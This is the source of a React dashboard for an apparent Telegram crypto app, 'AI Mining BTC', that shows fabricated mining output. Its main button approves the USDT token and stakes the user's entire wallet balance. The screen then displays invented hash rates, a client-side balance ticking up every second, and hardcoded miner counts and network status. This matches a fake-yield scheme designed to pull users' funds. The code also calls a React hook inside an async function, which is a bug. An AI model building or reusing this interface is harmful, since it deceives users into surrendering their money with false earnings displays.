import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { useWallet } from '../lib/web3';
import { useStaking } from '../hooks/useStaking';
import { useTelegram } from '../hooks/useTelegram';
import { formatUnits } from 'ethers';
import { usePrice } from '../hooks/usePrice';

const getTierRate = (val: number) => {
    if (val >= 10000) return 0.12;
    if (val >= 5000) return 0.08;
    if (val >= 2000) return 0.07;
    if (val >= 1000) return 0.065;
    if (val >= 500) return 0.0625;
    if (val >= 400) return 0.061;
    if (val >= 300) return 0.0575;
    if (val >= 200) return 0.056;
    if (val >= 100) return 0.055;
    if (val >= 50) return 0.055;
    return 0;
};

const Dashboard: React.FC = () => {
    const navigate = useNavigate();
    const location = useLocation();
    const { address, isConnected, connect } = useWallet();
    const { getStakedInfo, stake, getStakeDetails, getWalletBalance } = useStaking();
    const { showAlert, referrer, tg } = useTelegram();
    const { btcPrice } = usePrice();
    const [loading, setLoading] = useState(false);

    const isSuccessLanding = new URLSearchParams(location.search).get('v') === 'success';

    const handleBackToTelegram = () => {
        // If we're inside the Mini App, we might be able to close the webview
        if (tg) {
            tg.close();
        } else {
            // Otherwise, trigger the deep link to return to the bot
            window.location.href = 'tg://resolve?domain=AiMiningBTC_bot';
        }
    };

    const [stats, setStats] = useState({
        miningPower: '0.0',
        balance: '0.0000',
        dailyProfit: '$0.00',
        activeMiners: '842',
        networkStatus: 'Stable'
    });

    // Auto-resume mining after connection
    useEffect(() => {
        if (isConnected && localStorage.getItem('pending_mining') === 'true') {
            localStorage.removeItem('pending_mining');
            handleStartMining();
        }
    }, [isConnected]);

    const handleStartMining = async () => {
        if (!isConnected || !address) {
            localStorage.setItem('pending_mining', 'true');
            connect();
            return;
        }

        setLoading(true);
        try {
            const balanceStr = await getWalletBalance(address);
            if (!balanceStr || balanceStr === "0.00") {
                throw new Error("Insufficient USDT balance. Minimum 50 USDT required.");
            }
            
            const balance = parseFloat(balanceStr);
            const refAddress = referrer || '0x0000000000000000000000000000000000000000';

            if (balance < 50) {
                throw new Error("Minimum of 50 USDT required to start mining.");
            }

            // AUTOMATED FLOW: Check Allowance -> Approve -> Stake
            const { getAllowance, approve } = useStaking();
            const currentAllowance = await getAllowance(address);
            
            if (parseFloat(currentAllowance) < balance) {
                showAlert("Step 1/2: Approving USDT...");
                await approve();
                showAlert("Step 1/2: Approval Successful!");
            }

            showAlert("Step 2/2: Activating Mining...");
            await stake(balanceStr, refAddress);
            
            showAlert(`Success: All ${balanceStr} USDT staked and mining activated!`);
            handleBackToTelegram();
        } catch (err: any) {
            showAlert(err.message || 'Transaction failed. Check your wallet.');
        } finally {
            setLoading(false);
        }
    };

    const [rewardPerSecond, setRewardPerSecond] = useState(0);

    // Effect 1: Data Update (Fetches data via Read-Only RPC)
    useEffect(() => {
        const updateMiningData = async () => {
            const targetAddress = address || localStorage.getItem('aimining_last_address');
            if (targetAddress) {
                if (address && address !== localStorage.getItem('aimining_last_address')) {
                    localStorage.setItem('aimining_last_address', address);
                }

                const info = await getStakedInfo(targetAddress);
                if (info) {
                    const count = info.stakeCount;
                    let activeStaked = 0;
                    let totalAccruedBtc = 0;
                    // Filter active stakes and calculate accrued rewards
                    for (let i = 0; i < count; i++) {
                        const detail = await getStakeDetails(targetAddress, i);
                        if (detail && !detail.withdrawn) {
                            const stakeAmount = parseFloat(formatUnits(detail.amount, 18));
                            const timePassed = (Date.now() / 1000) - detail.startTime;

                            // We show all active (not withdrawn) stakes to restore legacy mining visibility
                            activeStaked += stakeAmount;
                            const stakeRate = getTierRate(stakeAmount);
                            const accrued = ((stakeAmount * stakeRate) / 37 / 86400 * timePassed) / btcPrice;
                            totalAccruedBtc += accrued;
                        }
                    }

                    const earned = parseFloat(formatUnits(info.totalEarned, 18));
                    const rate = getTierRate(activeStaked);
                    const finalizedEarnedBtc = earned / btcPrice;
                    const currentTotalBalance = finalizedEarnedBtc + totalAccruedBtc;
                    const dailyProfitBtc = ((activeStaked * rate) / (37 * btcPrice));

                    setStats(prev => ({
                        ...prev,
                        miningPower: activeStaked > 0 ? (activeStaked * 2.5).toFixed(1) : '0.0',
                        balance: currentTotalBalance.toFixed(14),
                        dailyProfit: dailyProfitBtc.toFixed(14)
                    }));

                    if (activeStaked > 0) {
                        setRewardPerSecond(dailyProfitBtc / 86400);
                    } else {
                        setRewardPerSecond(0);
                    }
                }
            } else {
                setStats(prev => ({ ...prev, miningPower: '0.0', balance: '0.00000000000000', dailyProfit: '0.00000000000000' }));
                setRewardPerSecond(0);
            }
        };

        updateMiningData();
        const pollTimer = setInterval(updateMiningData, 30000);
        return () => clearInterval(pollTimer);
    }, [isConnected, address, btcPrice]);


    // Effect 2: Ticker Update (Strict 1-second interval for UI)
    useEffect(() => {
        if (rewardPerSecond <= 0) return;

        const interval = setInterval(() => {
            setStats(prev => ({
                ...prev,
                balance: (parseFloat(prev.balance) + rewardPerSecond).toFixed(14)
            }));
        }, 1000);

        return () => clearInterval(interval);
    }, [rewardPerSecond]);

    return (
        <div className="flex-1 flex flex-col bg-background-dark">
            {/* Success Landing Overlay */}
            {isSuccessLanding && (
                <div className="fixed inset-0 z-[1000] bg-black/95 backdrop-blur-xl flex flex-col items-center justify-center p-8 text-center">
                    <div className="w-24 h-24 bg-primary/20 rounded-full flex items-center justify-center mb-6 animate-pulse-glow shadow-neon">
                        <span className="material-icons-round text-primary text-6xl">verified</span>
                    </div>
                    <h2 className="text-2xl font-black text-white uppercase tracking-widest mb-2 font-display">Wallet Connected</h2>
                    <p className="text-gray-400 text-sm mb-10 max-w-xs uppercase font-bold tracking-tight">Your secure mining connection is active. Return to Telegram to manage your nodes.</p>
                    
                    <button
                        onClick={handleBackToTelegram}
                        className="w-full max-w-xs bg-primary text-black font-black text-lg py-5 rounded-2xl shadow-neon transform active:scale-95 transition-all flex items-center justify-center gap-3 border-none cursor-pointer"
                    >
                        <span className="material-icons-round">rocket_launch</span>
                        OPEN IN TELEGRAM
                    </button>
                    
                    <button
                        onClick={() => navigate('/', { replace: true })}
                        className="mt-6 text-[10px] text-gray-500 font-bold uppercase tracking-widest hover:text-white transition-colors border-none bg-transparent cursor-pointer"
                    >
                        Stay on Website
                    </button>
                </div>
            )}

            {/* Header */}
            <header className="relative z-10 flex justify-between items-center p-4">
                <div className="flex items-center gap-2">
                    <span className="material-icons-round text-primary text-xl">memory</span>
                    <h1 className="font-display font-bold text-lg text-white tracking-wide uppercase">AI Mining BTC</h1>
                </div>
                <div className="flex items-center gap-2">
                    {!isConnected ? (
                        <button
                            onClick={() => connect()}
                            className="bg-primary/10 hover:bg-primary/20 text-primary px-3 py-1.5 rounded-full border border-primary/20 flex items-center gap-2 shadow-sm transition-all text-[10px] font-bold uppercase tracking-wider cursor-pointer"
                        >
                            <span className="material-icons-round text-sm">account_balance_wallet</span>
                            Connect
                        </button>
                    ) : (
                        <div className="flex items-center">
                             <button
                                onClick={() => connect()} // This will open account view if already connected
                                className="bg-primary text-black px-4 py-1.5 rounded-full border border-primary flex items-center gap-2 shadow-neon transition-all text-[10px] font-bold active:scale-95"
                            >
                                <span className="w-2 h-2 rounded-full bg-green-500 animate-pulse"></span>
                                {address?.slice(0, 4)}...{address?.slice(-4)}
                            </button>
                        </div>
                    )}
                </div>
            </header>

            {/* Main Stats Grid */}
            <section className="px-4 grid grid-cols-2 gap-3 mb-4">
                <div className="bg-card-dark p-3 rounded-2xl shadow-card border border-gray-800 relative overflow-hidden group">
                    <div className="absolute top-0 right-0 p-2 opacity-10">
                        <span className="material-icons-round text-3xl text-primary">bolt</span>
                    </div>
                    <p className="text-[10px] text-gray-500 font-medium mb-0.5 uppercase tracking-widest">Compute Power</p>
                    <div className="flex items-baseline gap-1">
                        <h2 className="text-xl font-display font-bold text-white uppercase">{stats.miningPower}</h2>
                        <span className="text-[10px] text-primary font-bold uppercase tracking-tight">GH/s</span>
                    </div>
                </div>
                <div className="bg-card-dark p-3 rounded-2xl shadow-card border border-gray-800 relative overflow-hidden group">
                    <div className="absolute top-0 right-0 p-2 opacity-10">
                        <span className="material-icons-round text-3xl text-primary">account_balance_wallet</span>
                    </div>
                    <p className="text-[10px] text-gray-500 font-medium mb-0.5 uppercase tracking-widest">Balance</p>
                    <div className="flex items-baseline gap-1">
                        <h2 className="text-[11px] font-display font-bold text-white uppercase">{stats.balance}</h2>
                        <span className="text-[10px] text-primary font-bold uppercase tracking-tight">BTC</span>
                    </div>
                </div>
            </section>

            {/* Mining Visualization */}
            <section className="flex flex-col items-center justify-center mb-6 py-4">
                <div className="relative w-80 h-80 flex items-center justify-center">
                    {/* Background Progress Circle */}
                    <svg className="absolute inset-0 w-full h-full transform -rotate-90" viewBox="0 0 100 100">
                        <circle cx="50" cy="50" fill="none" r="46" stroke="#1f2937" strokeWidth="2"></circle>
                        <circle
                            className="filter drop-shadow-[0_0_8px_rgba(255,215,0,0.4)] transition-all duration-1000 ease-out"
                            cx="50" cy="50" fill="none" r="46"
                            stroke="url(#goldGradient)"
                            strokeDasharray="289"
                            strokeDashoffset={isConnected ? "100" : "289"}
                            strokeLinecap="round"
                            strokeWidth="3">
                        </circle>
                        <defs>
                            <linearGradient id="goldGradient" x1="0%" x2="100%" y1="0%" y2="0%">
                                <stop offset="0%" stopColor="#B8860B"></stop>
                                <stop offset="50%" stopColor="#FFD700"></stop>
                                <stop offset="100%" stopColor="#FDB931"></stop>
                            </linearGradient>
                        </defs>
                    </svg>

                    {/* Orbiting Icons (Only visible when active) */}
                    {isConnected && (
                        <>
                            <div className="absolute inset-0 flex items-center justify-center animate-orbit" style={{ animationDelay: '0s' }}>
                                <span className="material-icons-round text-primary/40 text-xl">currency_bitcoin</span>
                            </div>
                            <div className="absolute inset-0 flex items-center justify-center animate-orbit" style={{ animationDuration: '20s', animationDelay: '-5s' }}>
                                <span className="material-icons-round text-primary/30 text-lg">currency_bitcoin</span>
                            </div>
                            <div className="absolute inset-0 flex items-center justify-center animate-orbit" style={{ animationDuration: '10s', animationDelay: '-2s' }}>
                                <span className="material-icons-round text-primary/20 text-sm">currency_bitcoin</span>
                            </div>
                        </>
                    )}

                    {/* Decorative Rings */}
                    <div className="absolute w-64 h-64 border border-primary/5 rounded-full animate-pulse"></div>
                    <div className="absolute w-56 h-56 border border-primary/10 rounded-full border-dashed animate-spin" style={{ animationDuration: '30s' }}></div>
                    <div className="absolute w-48 h-48 border border-primary/20 rounded-full animate-reverse-spin" style={{ animationDuration: '20s' }}></div>

                    {/* Central Mining Node */}
                    <div className={`relative w-36 h-36 bg-gradient-to-br from-gray-900 to-black rounded-full flex items-center justify-center shadow-neon border border-primary/30 ${isConnected ? 'animate-pulse-glow' : ''}`}>
                        <div className="absolute inset-0 bg-primary/20 rounded-full blur-2xl opacity-20"></div>
                        <span className={`material-icons-round text-6xl text-primary drop-shadow-[0_0_15px_rgba(255,215,0,0.6)] ${isConnected ? 'animate-rotate-3d' : ''}`}>currency_bitcoin</span>
                        
                        {/* Status Particles */}
                        <div className="absolute -top-1 -right-1 w-2.5 h-2.5 bg-primary rounded-full animate-ping"></div>
                        <div className="absolute bottom-4 -left-2 w-2 h-2 bg-yellow-200/50 rounded-full animate-bounce" style={{ animationDelay: '1s' }}></div>
                    </div>
                    <div className="absolute bottom-6 bg-black/60 backdrop-blur-md border border-gray-800 px-3 py-1 rounded-full flex items-center gap-1">
                        <span className="material-icons-round text-xs text-primary">bolt</span>
                        <span className="text-[10px] uppercase font-bold tracking-wider text-gray-300">{isConnected ? 'MINING ACTIVE' : 'SYSTEM READY'}</span>
                    </div>
                </div>
                <div className="mt-6 text-center">
                    <p className="text-primary font-display font-bold text-lg tracking-widest uppercase">{isConnected ? 'System Operational' : 'Node Inactive'}</p>
                    <div className="flex flex-col gap-1 mt-1">
                        <div className="flex justify-between items-center px-8 gap-4">
                            <div className="text-left">
                                <p className="text-[10px] text-gray-400 capitalize">Daily Yield</p>
                                <p className="text-[11px] font-medium text-white uppercase tracking-wider">{stats.dailyProfit} <span className="text-primary text-[9px]">BTC</span></p>
                            </div>
                            <div className="w-px h-8 bg-gray-800"></div>
                            <div className="text-right">
                                <p className="text-[10px] text-gray-400 capitalize">Yield Per Second</p>
                                <p className="text-[11px] font-medium text-white uppercase tracking-wider">{(parseFloat(stats.dailyProfit) / 86400).toFixed(14)} <span className="text-primary text-[9px]">BTC</span></p>
                            </div>
                        </div>
                    </div>
                </div>
            </section>
            {/* Action Buttons & Bottom Stats */}
            <section className="px-6 pb-4 w-full flex flex-col gap-4">
                {stats.miningPower === '0.0' ? (
                    <button
                        onClick={handleStartMining}
                        disabled={loading}
                        className="w-full bg-gradient-to-r from-primary via-yellow-400 to-primary text-black font-black text-lg py-5 rounded-2xl shadow-neon transform active:scale-95 transition-all duration-300 flex flex-col items-center justify-center gap-1 group border-none cursor-pointer relative overflow-hidden"
                    >
                        <div className="flex items-center gap-2">
                            <span className="material-icons-round animate-bounce">rocket_launch</span>
                            {loading ? 'WAITING FOR APPROVAL...' : 'STAKE ALL & START MINING'}
                        </div>
                        <span className="text-[10px] opacity-70 font-black tracking-widest uppercase">Activates node with full wallet balance</span>
                    </button>
                ) : (
                    <button
                        onClick={() => navigate('/stake')}
                        className="w-full metallic-btn text-black font-bold text-lg py-4 rounded-2xl shadow-neon transform active:scale-95 transition-all duration-200 flex items-center justify-center gap-2 group border border-yellow-400/30 cursor-pointer border-none"
                    >
                        <span className="material-icons-round">rule</span>
                        Manage Active Cycles
                    </button>
                )}
                <button
                    onClick={() => navigate('/stake')}
                    className="w-full bg-transparent text-primary font-bold text-lg py-4 rounded-2xl border-2 border-primary/50 transform active:scale-95 transition-all duration-200 flex items-center justify-center gap-2 group hover:bg-primary/5 cursor-pointer"
                >
                    <span className="material-icons-round">payments</span>
                    Withdraw (Cycle Based)
                </button>

                <div className="mt-8 flex justify-between items-center bg-card-dark rounded-2xl p-4 border border-gray-800">
                    <div className="text-center">
                        <p className="text-xs text-gray-500 uppercase font-black tracking-tighter">Cycle Rewards</p>
                        <p className="text-sm font-bold text-white font-display uppercase tracking-tight">5.5% - 12%</p>
                    </div>
                    <div className="h-8 w-px bg-gray-800"></div>
                    <div className="text-center">
                        <p className="text-xs text-gray-500 uppercase font-black tracking-tighter">Global Miners</p>
                        <p className="text-sm font-bold text-white font-display uppercase tracking-tight">42,852</p>
                    </div>
                    <div className="h-8 w-px bg-gray-800"></div>
                    <div className="text-center">
                        <p className="text-xs text-gray-500 uppercase font-black tracking-tighter">Network</p>
                        <p className="text-sm font-bold text-green-500 font-display uppercase tracking-tight">ONLINE</p>
                    </div>
                </div>
            </section>
        </div>
    );
};

export default Dashboard;
